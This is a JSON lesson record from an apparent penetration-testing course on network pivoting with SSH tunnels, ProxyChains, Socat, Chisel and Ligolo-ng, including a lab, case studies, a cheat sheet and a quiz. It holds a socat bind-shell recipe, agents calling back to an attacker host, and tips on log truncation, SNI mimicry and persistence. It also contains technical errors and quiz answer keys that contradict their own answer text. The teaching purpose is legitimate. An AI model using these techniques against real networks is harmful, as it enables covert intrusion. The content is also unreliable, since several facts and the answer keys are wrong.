{
  "lesson_id": "6f1773ac-df6f-486f-b459-11d737362867",
  "domain": "pentest",
  "title": "Port Forwarding and Pivoting with Linux Tools",
  "difficulty": 3,
  "order_index": 25,
  "prerequisites": [
    "pentest_03"
  ],
  "concepts": [
    "SSH local port forwarding (-L)",
    "SSH remote port forwarding (-R)",
    "SSH dynamic port forwarding (SOCKS proxy -D)",
    "ProxyChains configuration and usage",
    "Socat for port redirection",
    "Chisel for HTTP tunneling",
    "Ligolo-ng for network pivoting",
    "multi-hop pivoting scenarios",
    "troubleshooting pivot connections"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Configure SSH tunnels in local, remote, and dynamic modes to reroute traffic through pivot hosts",
    "Build and validate ProxyChains configurations that steer multiple tools through SOCKS tunnels",
    "Deploy Socat, Chisel, and Ligolo-ng to bridge incompatible network segments",
    "Design multi-hop pivot paths that traverse DMZ, internal, and restricted zones",
    "Instrument logging and packet captures to troubleshoot broken or unstable tunnels",
    "Integrate tunneling workflows into repeatable Linux-based pivot playbooks",
    "Assess the operational security trade-offs of each tunneling technique"
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "block_id": "5131c7bf-f601-466b-9b1d-00b54da48427",
      "type": "mindset_coach",
      "content": {
        "text": "Pivoting is the quiet superpower of Linux operators. You already know how to open terminals, chain commands, and pipe output; pivoting simply extends that mastery to entire networks. Imagine every system in a target environment as a locked room. Instead of trying to break down the reinforced door in front of you, pivoting invites you to look for air vents, hidden hallways, and maintenance tunnels. Your job is to notice which doors are unlocked, which hinges are loose, and which building schematics show forgotten access ways.\n\nToday you will nurture three mindsets: curiosity, composure, and choreography. **Curiosity** keeps you asking questions when packets vanish in the void: Where did the connection die? Is name resolution failing, or did a firewall inject a TCP reset? Which intermediate host quietly dropped my SYN? **Composure** matters because pivots frequently break at the worst moment. Tunnels collapse, credentials expire, daemons crash, logs fill up. Instead of spiraling, you will adopt the calmness of a field surgeon\u2014stop the bleeding, diagnose the wound, and rebuild the path. **Choreography** reminds you that advanced pivoting is a dance across multiple stages: workstation \u2192 jump host \u2192 DMZ \u2192 internal network \u2192 crown jewels. Every hop must be timed, documented, and monitored.\n\nTake a moment to visualize success. You are on a Linux attack box in a hotel room. You have a foothold on a DMZ bastion host, a second foothold on an internal application server, and credentials to a restricted database network. You will orchestrate SSH local forwards, dynamic SOCKS tunnels, ProxyChains, and modern tunneling agents such as Chisel and Ligolo-ng. You will monitor `ss -tuna` to confirm listeners, read `/var/log/auth.log` to spot denied attempts, and tail `proxychains.log` to debug DNS. You will be methodical, documenting port mappings, credentials, and cleanup steps in a plain-text pivot diary.\n\nThis lesson is long because mastery demands repetition. That is good news for you: every detailed walkthrough is an opportunity to flex your problem-solving muscles. When you feel overwhelmed by the number of moving parts, zoom out and anchor yourself to the fundamentals: source IP, destination IP, source port, destination port, protocol, and transport. Tunneling is just creative routing layered atop those basics.\n\nYou will also practice ethical awareness. Pivoting is powerful enough to cause downtime or break trust if misused. Approach each lab with the professionalism of a consultant inside a sensitive enterprise. Ask: What is the impact if this tunnel stays up overnight? Could logging the wrong credential in ProxyChains leak secrets? How do I demonstrate value to the defender by documenting detection opportunities?\n\nBefore diving into commands, tidy your operator workspace. Create a `~/engagements/clientX/pivots` directory. Within it, prepare a `README_pivot.md` template with sections for hop name, command executed, verification output, notes, and cleanup. Set up tmux sessions labeled `pivot-ssh`, `pivot-proxychains`, `pivot-logs`, and `pivot-capture` so you can split responsibilities across panes. Load `watch -n 5 date` in one pane as a heartbeat reminder that time is passing; disciplined time awareness prevents you from leaving unstable tunnels running overnight.\n\nHere is your mental warm-up routine:\n\n1. **Reframe friction as feedback.** When a forward fails, it is data. Note the symptom, identify the layer (network, transport, auth), and iterate.\n2. **Narrate your actions.** Explain aloud why you are adding `-N` to an SSH command or why you chose remote forwarding instead of local. Verbalizing steps accelerates retention.\n3. **Chunk the choreography.** Treat each hop as a mini project: enumerate interfaces, test connectivity, create the tunnel, validate, then document. Once a hop is stable, move to the next.\n4. **Celebrate micro-wins.** The first time you see `Connected to 127.0.0.1 port 9050` in ProxyChains, pause and acknowledge the progress. Momentum fuels mastery.\n5. **Protect your focus.** Pivoting requires attention to detail. Silence notifications, set a 25-minute Pomodoro timer, and commit to deliberate practice. Write down distracting ideas in a capture notebook to revisit later instead of letting them derail your flow.\n\nBy the end of this session you will not just execute commands\u2014you will think like a network choreographer who transforms isolated systems into a navigable pathway. Take a breath, commit to curiosity, and step into the operator mindset."
      }
    },
    {
      "block_id": "e9dc9c4e-b795-4406-8381-9fabeb14c8a4",
      "type": "explanation",
      "content": {
        "text": "### SSH Tunneling Fundamentals\n\nAt its core, SSH tunneling is a wrapper. You already know how SSH creates encrypted sessions; with port forwarding you borrow that encryption to smuggle other traffic. Three modes matter most on Linux: **local (-L)**, **remote (-R)**, and **dynamic (-D)**.\n\n*Local forwarding* (`ssh -L 8080:internal-web:80 user@pivot-host`) listens on your localhost port 8080 and forwards anything hitting that port through the SSH tunnel toward `internal-web:80`. The remote SSH server acts as a router, connecting to the internal service on your behalf. Use this when you can reach the pivot host but not the internal service directly.\n\n*Remote forwarding* (`ssh -R 2222:localhost:22 user@pivot-host`) is the mirror image. You ask the remote host to listen on its port 2222. Any connection to that port travels through the SSH tunnel back to your localhost on port 22. This is invaluable when the compromised host cannot initiate outbound connections to you, yet you need persistent access. Pair it with a cloud VPS as the catcher's mitt.\n\n*Dynamic forwarding* (`ssh -D 9050 user@pivot-host`) creates a SOCKS proxy that supports multiple destinations. Instead of binding to a specific remote service, your tools become SOCKS-aware and ask the tunnel to route traffic to whichever host and port they require. Combine dynamic forwarding with ProxyChains for wide coverage.\n\nImportant flags include `-N` (no remote command execution) to keep tunnels persistent, `-f` (background the session), and `-C` (compression). When layering multiple forwards in a single command, repeat the flag: `ssh -f -N -L 127.0.0.1:3307:db01.internal:3306 -L 127.0.0.1:8081:web.internal:80 user@pivot`. For multi-user teams, create aliases in `~/.ssh/config`:\n\n```\nHost dmz-bastion\nHostName 10.0.5.10\nUser analyst\nLocalForward 8080 internal-web:80\nDynamicForward 9050\nServerAliveInterval 60\nServerAliveCountMax 3\n```\n\nThis configuration standardizes commands and injects keepalives to avoid idle disconnects.\n\n### ProxyChains Deep Dive\n\nProxyChains intercepts dynamic library calls (`connect`, `sendto`) and routes them through defined proxies. The configuration file `/etc/proxychains.conf` or `~/.proxychains/proxychains.conf` lets you chain multiple proxies (SOCKS4, SOCKS5, HTTP CONNECT). A minimal entry looks like:\n\n```\nsocks5 127.0.0.1 9050\n```\n\nThis directs traffic through the SSH dynamic port on localhost. For multi-hop SOCKS proxies, list them in order; ProxyChains tries the last entries first when `random_chain` is disabled. Combine ProxyChains with `/etc/resolvconf` so local resolvers use `127.0.0.1` and respect the tunnel. Enable logging by running `PROXYCHAINS_LOG=~/proxychains.log proxychains4 nmap ...` to capture each connection attempt for post-exploitation analysis.\n\nKey directives:\n\n- `strict_chain` ensures proxies are used in the exact order.\n- `proxy_dns` forces DNS lookups through the proxy, preventing leaking queries from your local resolver.\n- `quiet_mode` suppresses banner noise during stealth operations.\n- `tcp_read_time_out` and `tcp_connect_time_out` help gracefully handle slow links in high-latency pivots.\n\nRun `proxychains4 nmap -sT -Pn -p 445 internal-dc` to route Nmap's TCP connect scan through your SOCKS tunnel. Validate with `tcpdump -i any port 9050` on your attack box: you should see encrypted traffic from your tools hitting the dynamic forward. For applications lacking SOCKS support, use `proxychains4 proxychains-ng` combined with `tsocks` or consider `sshuttle` for transparent VPN-like behavior.\n\n### Socat, Chisel, and Ligolo-ng\n\n**Socat** is the Swiss Army knife for piping sockets. Use it to forward UDP (e.g., `socat UDP4-LISTEN:161,fork TCP:127.0.0.1:1161`) or to create listener pivots when SSH is unavailable. Combine Socat with systemd services to maintain resilience: create `/etc/systemd/system/pivot-socat.service` with an `ExecStart` command and enable `Restart=always`. Monitor with `journalctl -u pivot-socat -f` to spot crash loops.\n\n**Chisel** offers HTTP-based tunneling. The server runs on your controlled infrastructure (`chisel server --reverse --port 8000`). On the compromised host, run `chisel client attacker:8000 R:9050:socks` to create a remote SOCKS proxy over HTTP. Chisel excels when only outbound HTTP/HTTPS is allowed. Its authentication tokens (`--auth user:pass`) and `--sni` option (to mimic TLS SNI) help blend in. Use `--keepalive 10s --max-retry-interval 60s` to maintain sessions on unstable Wi-Fi.\n\n**Ligolo-ng** focuses on agent-based pivoting with a central node. Deploy `ligolo-ng proxy -listen 0.0.0.0:11601 -selfcert` on your attack box. On the compromised host, start the agent (`ligolo-ng agent -connect attacker:11601 -ignore-cert -key key.pem -cert cert.pem`). After linking, use the interactive console to create tunnels: `session`, `ifconfig`, `route add 10.10.20.0/24 10.10.30.15`. Ligolo-ng supports full layer-3 tunnels with tun interfaces, letting you run native tools like `ping`, `smbclient`, or `ldapsearch` without SOCKS limitations. Enable pivot logging with `session watch` to track data transfer and detect anomalies.\n\n### Multi-Hop Pivoting Patterns\n\nA typical engagement involves multiple segments:\n\n1. **Attack box \u2192 Bastion**: Establish SSH dynamic forward: `ssh -D 9050 analyst@bastion.dmz`. Configure ProxyChains to use 9050.\n2. **Bastion \u2192 App Server**: Use SSH agent forwarding or drop Chisel to create `R:1080:socks`. Chain ProxyChains through 9050 (bastion) then 1080 (app). Document which credentials unlock each host and rotate keys if you stage persistent access.\n3. **App Server \u2192 Database**: Local forward on app server: `ssh -L 5433:db.internal:5432 appuser@dbjump`. Access PostgreSQL locally via `psql -h 127.0.0.1 -p 5433`. Store credentials in a secure vault or encrypted notes to avoid accidental exposure in shell history.\n4. **Monitoring**: Run `watch -n 2 \"ss -tuna | grep -E '9050|1080|5433'\"` on each host. Use `journalctl -u ssh` to watch for warnings. Pair with `iftop -i tun0` or `bmon` to visualize throughput and detect runaway traffic that could alert defenders.\n5. **Validation**: For each hop, capture a packet trace with `tcpdump -i interface -w hop1.pcap` and annotate what you expect to see. Replay with Wireshark to confirm encryption boundaries and verify there is no unexpected plaintext leakage.\n\nDocument each hop with: entry/exit IP, authentication method, command used, verification command, dependencies (ProxyChains config, credentials). Include timestamps and TTL values from `ping` tests to identify when routes change unexpectedly.\n\n### Troubleshooting Framework\n\nWhen a pivot breaks, start with a five-layer checklist:\n\n- **Layer 1: Host health** \u2013 Did the remote host reboot? Check `uptime` and `last -x`. Are firewall rules reloading? Inspect `sudo iptables -L -n`. Use `dmesg | tail` to catch kernel-level socket errors.\n- **Layer 2: Process** \u2013 Is the tunnel process running? `ps aux | grep ssh -L`. Did systemd kill idle sessions? Add `ClientAliveInterval 60` in sshd config. Consider `autossh -M 0` to automatically restart tunnels.\n- **Layer 3: Socket** \u2013 Validate with `ss -tlnp` or `lsof -i`. Is the listener bound to the correct interface (127.0.0.1 vs 0.0.0.0)? Confirm there are no conflicting services occupying the same port.\n- **Layer 4: Path** \u2013 Use `traceroute` or `mtr` through the tunnel. For SOCKS, use `proxychains4 curl -I https://ifconfig.me` to confirm egress IP. Check `iptables -t nat -L -n` on intermediate hosts for unexpected DNAT/SNAT rules.\n- **Layer 5: Authentication** \u2013 Are credentials still valid? Did the pivot host rotate keys? Re-run `ssh -vvv` for debug logs showing handshake failures. Validate that `known_hosts` entries are correct; remove stale keys with `ssh-keygen -R host` when necessary.\n\n### Operational Security\n\nPivoting leaves artifacts. Limit detection by:\n\n- Using non-default ports (e.g., `-D 1081` instead of 9050) and mimicking legitimate processes (prefixing commands with `sudo -u backup`).\n- Cleaning up logs: `sudo truncate -s0 /var/log/auth.log` only when rules allow; otherwise annotate findings for defenders. Combine with `logsave` to preserve forensic evidence responsibly.\n- Rotating pivot credentials separate from exploitation credentials and storing them in password managers like `pass` or `gopass`.\n- Setting up `autossh` for resilience with minimal noise (`AUTOSSH_GATETIME=0`). Pair with `systemd-run --scope autossh ...` to manage lifecycle cleanly.\n- Establishing out-of-band monitoring: run `while true; do date; ss -tuna | grep 9050; sleep 60; done | tee -a ~/pivot_health.log` on your attack box.\n\nPivoting is iterative. Mastery comes from repeatedly building, breaking, and repairing tunnels until the workflow is muscle memory. Maintain a retrospective log after each engagement highlighting which pivots were fragile, which commands you wish you had aliased, and which detections the blue team actually triggered."
      }
    },
    {
      "block_id": "1a1302eb-a710-496b-af55-2fb4ef13dba2",
      "type": "video",
      "content": {
        "title": "Video Walkthrough: Multi-Hop SSH Pivoting on Linux",
        "url": "https://www.youtube.com/watch?v=xn2poczX1rg",
        "description": "This tutorial by TheCyberMentor demonstrates chaining SSH tunnels, configuring ProxyChains, and validating traffic flow with tcpdump. Watch the full 28-minute breakdown to visualize each command sequence, pause at the timestamps that mirror this lesson's labs, and take notes on the troubleshooting techniques shown in the console output."
      }
    },
    {
      "block_id": "cd1df254-ed2a-4f51-9e89-135e4f3d462a",
      "type": "code_exercise",
      "content": {
        "title": "Hands-On Lab: Build a Multi-Hop Tunnel",
        "description": "Follow these steps on your lab environment. Assume you control three virtual machines: `attack` (Kali), `pivot1` (Ubuntu in the DMZ), and `pivot2` (Debian inside the internal network). A PostgreSQL server (`db.internal`) is reachable only from `pivot2`. Your goal is to query the database from `attack` using chained tunnels.\n\n1. **Baseline checks**: On `attack`, run `ip a` and note your interface. Ping `pivot1` (`ping -c 3 10.0.5.10`). SSH in once manually (`ssh analyst@10.0.5.10`) to accept host keys. Record latency to spot later anomalies.\n2. **Establish dynamic forward**: Run `ssh -f -N -D 9050 analyst@10.0.5.10`. On `attack`, edit `~/.proxychains/pivot.conf` with `strict_chain`, `proxy_dns`, and `socks5 127.0.0.1 9050`. Export `PROXYCHAINS_CONF_FILE=~/.proxychains/pivot.conf`. Capture the command output using `script -a stage1.log` for documentation.\n3. **Validate Stage 1**: Run `proxychains4 curl -s https://ifconfig.me` and confirm the IP matches `pivot1`. Capture with `sudo tcpdump -i tun0 port 9050 -n`. Save the pcap to `stage1.pcap` and annotate notable packets.\n4. **Deploy Chisel for stage two**: Upload `chisel` binary to `pivot1`. Start the server on `attack`: `chisel server --reverse --port 8000 --auth pivot:chain --key pivot.key`. On `pivot1`, run `./chisel client attack:8000 --auth pivot:chain --fingerprint $(cat fingerprint.txt) R:1080:socks`. This creates a SOCKS proxy on `attack` accessible via the Chisel reverse tunnel. Add a second entry to `pivot.conf`: `socks5 127.0.0.1 1080`. Enable `dynamic_chain` to allow failover between proxies. Log Chisel output to `~/chisel.log` for later review.\n5. **Access pivot2**: Use ProxyChains to SSH: `proxychains4 ssh -J analyst@10.0.5.10 internal@10.10.20.15`. Once on `pivot2`, confirm connectivity to the database host: `nc -zv db.internal 5432`. Document success or failure in your pivot diary.\n6. **Local forward on pivot2**: On `pivot2`, run `ssh -f -N -L 127.0.0.1:5433:db.internal:5432 pivot2@dbjump`. This opens PostgreSQL on `pivot2`'s loopback. Use `ss -tlnp | grep 5433` to verify and note the process ID.\n7. **Expose the local forward outward**: Still on `pivot2`, launch `socat TCP4-LISTEN:15433,fork TCP4:127.0.0.1:5433`. This allows remote hosts (including `pivot1`) to hit port 15433. Harden with firewalls in real operations by restricting source addresses via `iptables -A INPUT -p tcp --dport 15433 -s 10.0.5.10 -j ACCEPT`.\n8. **Bridge pivot1 to pivot2**: On `pivot1`, establish an SSH remote forward that points back to `pivot2`: `ssh -f -N -R 15433:127.0.0.1:15433 internal@10.10.20.15`. Now any connection to `pivot1:15433` travels to the database. Verify with `ssh internal@10.10.20.15 'ss -tln | grep 15433'`.\n9. **Reach from attack box**: Add a final local forward on `attack`: `ssh -f -N -L 15433:127.0.0.1:15433 analyst@10.0.5.10`. Launch `psql -h 127.0.0.1 -p 15433 -U analyst reporting`. Query `SELECT current_database(), inet_client_addr();` to confirm the path. Record query timing to measure tunnel latency.\n10. **Troubleshoot**: If queries hang, inspect each hop. Use `proxychains4 nc -zv 127.0.0.1 15433` to test the chain. Check logs: `journalctl -u ssh -S -5m` on each pivot. Restart Chisel if needed and note the recovery time.\n11. **Automate with autossh**: Replace manual SSH commands with `autossh -M 0 -f -N -D 9050 analyst@10.0.5.10` and observe how auto-reconnection changes stability. Document pros/cons.\n12. **Cleanup**: Kill processes with `pkill -f 'ssh -f -N'`, `pkill chisel`, `pkill socat`. Remove binaries and restore ProxyChains config. Confirm no residual sockets using `ss -tuna`.\n\n**Stretch Goals**:\n- Add a fourth hop by launching Ligolo-ng from `pivot2` into a simulated management VLAN and route `10.10.40.0/24` traffic.\n- Capture CPU and memory usage of each pivot process with `pidstat` to understand resource footprints.\n- Write a bash script that rebuilds the entire tunnel chain automatically and stores status output in a timestamped log directory.\n\nDeliverables: a diagram with all ports/hops, command history exported via `scriptreplay`, and a short write-up describing detection opportunities. Include at least three detection ideas (network, endpoint, logging) for each hop."
      }
    },
    {
      "block_id": "d24359fa-6e44-4d22-ad1c-83bba732b8d2",
      "type": "real_world",
      "content": {
        "text": "### Case Study 1: DMZ to Finance Network\n\nA retail client segmented their environment into internet, DMZ, internal, and finance VLANs. During a penetration test, we exploited an outdated CMS on a DMZ web server, obtaining SSH access. From the DMZ host we could not reach the finance VLAN directly; routers enforced ACLs. However, the DMZ host maintained SSH trust with an internal application server for nightly deployments.\n\nWe established `ssh -D 1080` on the DMZ server and chained ProxyChains to the app server. Once inside, we discovered a maintenance account with `sudo` rights on a finance jump server accessible only from the app VLAN. Using `ssh -R 8443:127.0.0.1:8443 jump@finance` we created a remote forward back to our DMZ host, then `ssh -L 1521:finance-db:1521` on the jump server to access Oracle. By combining local and remote forwards we pivoted three layers deep. Logging revealed the entire finance segment because Oracle stored plaintext credentials. The defender closed the gap by enforcing multi-factor authentication on the deployment account and auditing SSH key trust relationships.\n\n### Case Study 2: Manufacturing Plant with Strict Egress\n\nIn a manufacturing plant, only outbound HTTPS was allowed from workstation VLANs. After compromising an engineering workstation we deployed Chisel in reverse mode to our VPS on port 443 with a valid certificate. With the `--sni fileshare.company.com` option we blended with legitimate traffic. On the workstation we launched Ligolo-ng to establish a layer-3 tunnel across the Chisel SOCKS proxy, enabling `smbclient` to enumerate SMB shares on the OT network.\n\nWe documented every detection opportunity: unusual TLS SNI values, long-lived outbound HTTPS sessions, and the creation of a TUN interface. The blue team responded by enabling TLS inspection on outbound traffic and implementing network segmentation between engineering and OT networks. They also added host-based monitoring for sudden TUN/TAP device creation using osquery.\n\n### Case Study 3: Cloud Hybrid Pivot\n\nA financial firm hosted a hybrid environment\u2014on-prem Active Directory with workloads in Azure. The initial foothold was an Azure VM with SSH access. To reach on-prem systems, we created an OpenVPN tunnel from the Azure VM to our infrastructure (because outbound UDP 1194 was permitted), then layered SSH local forwards to hit on-prem SQL servers accessible through a site-to-site VPN. By forwarding `-L 14330:onprem-sql:1433` we could run SQL queries from our remote machine.\n\nHowever, we noticed intermittent disconnects. Troubleshooting showed Azure's idle timeout closing TCP sessions after 4 minutes. We mitigated this by adding `ServerAliveInterval 60` on the SSH command and `ClientAliveInterval 60` on the pivot host to send keepalives. We also configured `autossh -M 0` to automatically reconnect. The defenders later deployed Azure Sentinel analytics to alert on outbound tunnels with sustained throughput and implemented Private Link to remove unnecessary cross-premises access.\n\n### Case Study 4: Research Lab with Legacy Protocols\n\nDuring an assessment for a biotech lab, we compromised a Linux workstation that had access to a legacy instrument network using SMB over NetBIOS and custom RPC. SOCKS proxies broke these protocols because IP addresses were embedded within payloads. The solution involved Ligolo-ng to establish a layer-3 tunnel, followed by `iptables` NAT rules on the pivot host to masquerade traffic as originating from the instrument subnet. We also used `socat` to convert raw serial-over-TCP traffic so maintenance utilities could function. This highlighted the importance of flexible tooling when modern applications interact with outdated services.\n\n### Lessons Learned\n\n1. **Document implicit trusts**: Most successful pivots exploited administrators' convenience (SSH key trusts, shared service accounts).\n2. **Favor layer-3 tunnels for legacy protocols**: SOCKS proxies struggle with protocols that embed IP addresses; Ligolo-ng or VPN tunnels solved this.\n3. **Include defenders in the narrative**: Each pivot included a detection and mitigation recommendation, making the report actionable.\n4. **Watch for third-party impact**: Vendor-managed systems often have undocumented tunnels. Always coordinate with stakeholders before stress testing those routes.\n5. **Prioritize cleanup**: After each engagement, remove binaries, revoke keys, and provide defenders with a manifest of every tunnel you established. Transparency builds trust and sets the stage for future collaboration.\n\nReal-world pivoting balances creativity with restraint. You must honor rules of engagement while revealing systemic weaknesses."
      }
    },
    {
      "block_id": "9e6300dc-0daf-44c8-81df-2b73f6c3aaa2",
      "type": "memory_aid",
      "content": {
        "text": "### Pivoting Cheat Sheet\n\n**SSH Local (-L)**\n- Purpose: Access internal service through pivot\n- Syntax: `ssh -f -N -L [bind_addr:]bind_port:target:port user@pivot`\n- Checklist: Confirm local listener (`ss -tln`), test with `curl` or `nc`, log commands.\n- Detection tip: Monitor for unusual localhost listeners on analyst workstations.\n\n**SSH Remote (-R)**\n- Purpose: Expose local service to remote host\n- Syntax: `ssh -f -N -R remote_port:target:port user@pivot`\n- Checklist: Confirm remote listener (`ssh pivot 'ss -tln | grep remote_port'`), ensure `GatewayPorts yes` if binding beyond loopback.\n- OPSEC tip: Use high random ports and remove `~/.ssh/authorized_keys` entries after use.\n\n**SSH Dynamic (-D)**\n- Purpose: SOCKS proxy for many destinations\n- Syntax: `ssh -f -N -D [bind_addr:]port user@pivot`\n- Checklist: Update ProxyChains, enable `proxy_dns`, verify with `curl ifconfig.me`.\n- Tool pairing: ProxyChains, Firefox configured with FoxyProxy, proxy-aware Python scripts via `requests[socks]`.\n\n**ProxyChains Configuration**\n- File order matters: bottom of list is attempted first.\n- Use `strict_chain` for deterministic hops.\n- Enable logging: `proxychains4 -f ~/.proxychains/pivot.conf -q tool`.\n- Add `[ProxyList]` comments to document purpose of each proxy.\n\n**Socat Recipes**\n- TCP to TCP: `socat TCP4-LISTEN:4444,fork TCP4:target:80`.\n- UDP to TCP: `socat UDP4-LISTEN:161,fork TCP4:127.0.0.1:161`.\n- Pipe to shell: `socat TCP4-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash`.\n- File descriptor duplication: `socat -d -d OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,reuseaddr,fork TCP4:target:80`.\n\n**Chisel Essentials**\n- Server: `chisel server --reverse --port 443 --tls-key key.pem --tls-cert cert.pem`.\n- Client: `chisel client server:443 R:1080:socks`.\n- Flags: `--auth user:pass`, `--keepalive 5s`, `--fingerprint`.\n- Storage tip: Pre-stage binaries in `/usr/local/bin` with root-owned permissions to survive reboots.\n\n**Ligolo-ng Workflow**\n1. Run proxy on attacker.\n2. Launch agent on pivot: `./agent -connect attacker:11601 -ignore-cert`.\n3. In console: `session 1`, `ifconfig`, `start`.\n4. Add routes: `route add 10.10.40.0/24 10.10.30.15`.\n5. Use native tools (ping, smbclient).\n6. Create reverse port forwards: `listen 0.0.0.0 445 10.10.40.12 445` for SMB relays.\n\n**Troubleshooting Ladder**\n1. `ping` and `traceroute` to confirm reachability.\n2. `ss -tulwn` to verify listeners.\n3. `ps aux | grep tool` to ensure processes alive.\n4. `journalctl -u ssh -f` for authentication errors.\n5. `tcpdump -i interface port` to inspect flows.\n6. `strace -f -p <pid>` when a process hangs; look for blocked syscalls.\n\n**Documentation Template**\n- Hop ID\n- Entry host/IP\n- Exit host/IP\n- Command executed\n- Credentials used\n- Verification command\n- Logs captured\n- Cleanup actions\n- Detection notes\n\n**Risk Mitigation Reminders**\n- Limit pivot duration; schedule auto-shutdown with `at now + 2 hours` to run cleanup script.\n- Encrypt sensitive configuration files using `gpg` when storing on shared servers.\n- Always inform the engagement lead before enabling persistent services.\n\nKeep this cheat sheet next to your keyboard during engagements."
      }
    },
    {
      "block_id": "39101dc2-fdae-42b8-8bb5-4547df01a767",
      "type": "reflection",
      "content": {
        "text": "Reflect on today's choreography by answering these prompts in your journal.\n\n1. **Map your mental model**: Draw or describe the most complex tunnel you built. Label each hop with protocol, port, authentication, tool, and the business justification for traversing it.\n2. **Troubleshooting win**: Recall a moment when a tunnel failed. Which diagnostic step solved it? How can you reduce time-to-diagnosis next time? Could you automate that diagnostic?\n3. **OPSEC choices**: Did you choose noisy defaults (e.g., 1080, 9050)? How would you stealth them in a real enterprise? What cover traffic or user behavior could you emulate?\n4. **Skill transfer**: Identify a skill from Linux administration that translated well (systemd services, log analysis, SSH configuration). How will you leverage it deliberately going forward?\n5. **Feedback loop**: List three metrics you will track on future pivots (uptime, latency, recon tool success rates). Decide how you will capture them (scripts, dashboards, manual logs).\n6. **Team coordination**: If you were collaborating with another tester, what communication rituals would you adopt to avoid stepping on each other's tunnels? Consider daily standups, shared tmux sessions, or status kanban boards.\n7. **Defender empathy**: Imagine you are the SOC analyst watching these pivots. Which log sources would you monitor? How would you prioritize response without causing a network outage?\n\nClose by writing a short affirmation: *\"I choreograph networks with precision and ethics.\"* Then schedule a practice slot within the next week to rebuild the lab from scratch without notes. During that session, challenge yourself to swap one tool (e.g., replace Chisel with Socat) so the workflow stays flexible."
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "e97dda55-d8b2-464d-8806-851e9c3a9eed",
      "question": "You create `ssh -f -N -D 9050 analyst@dmz`. ProxyChains is configured with `socks5 127.0.0.1 9050`, but DNS queries still leak from your local machine. Which ProxyChains directive fixes this?",
      "options": [
        "Enable `quiet_mode` to suppress resolver output",
        "Add `proxy_dns` so DNS lookups traverse the SOCKS tunnel",
        "Switch to `strict_chain` to force the proxy order",
        "Use `socks4` instead of `socks5` for DNS support"
      ],
      "answer": "Add `proxy_dns` so DNS lookups traverse the SOCKS tunnel",
      "explanation": "ProxyChains performs DNS locally unless `proxy_dns` is set. Enabling it routes DNS queries through the SOCKS proxy, preventing leaks.",
      "type": "multiple_choice",
      "correct_answer": 0,
      "difficulty": 2
    },
    {
      "question_id": "af93dced-bd41-415f-8f92-619a87feb290",
      "question": "Ligolo-ng tunnels fail intermittently when the agent is behind an outbound-only firewall. Packet captures show TCP resets from a proxy that allows only HTTPS. What adjustment keeps the tunnel alive?",
      "options": [
        "Switch Ligolo-ng to UDP mode",
        "Wrap Ligolo-ng inside a Chisel reverse tunnel over TCP 443",
        "Disable TLS on Ligolo-ng to avoid inspection",
        "Decrease the MTU on the attacker's TUN interface"
      ],
      "answer": "Wrap Ligolo-ng inside a Chisel reverse tunnel over TCP 443",
      "explanation": "Since only HTTPS egress is permitted, encapsulating Ligolo-ng traffic inside Chisel's HTTP/TLS channel allows it to pass the proxy while keeping the tunnel stable.",
      "type": "multiple_choice",
      "correct_answer": 0,
      "difficulty": 2
    },
    {
      "question": "What is the most important takeaway from this lesson?",
      "options": [
        "Understanding the core concepts and their practical applications",
        "Memorizing all technical details",
        "Only knowing the theory without practice",
        "Focusing on a single aspect"
      ],
      "correct_answer": 0,
      "explanation": "The key takeaway is understanding how to apply the concepts learned in real-world scenarios, combining both theoretical knowledge and practical skills.",
      "question_id": "d8620e36-ec66-4a53-a1f4-08f9a33bef0e",
      "type": "multiple_choice",
      "difficulty": 1
    }
  ]
}
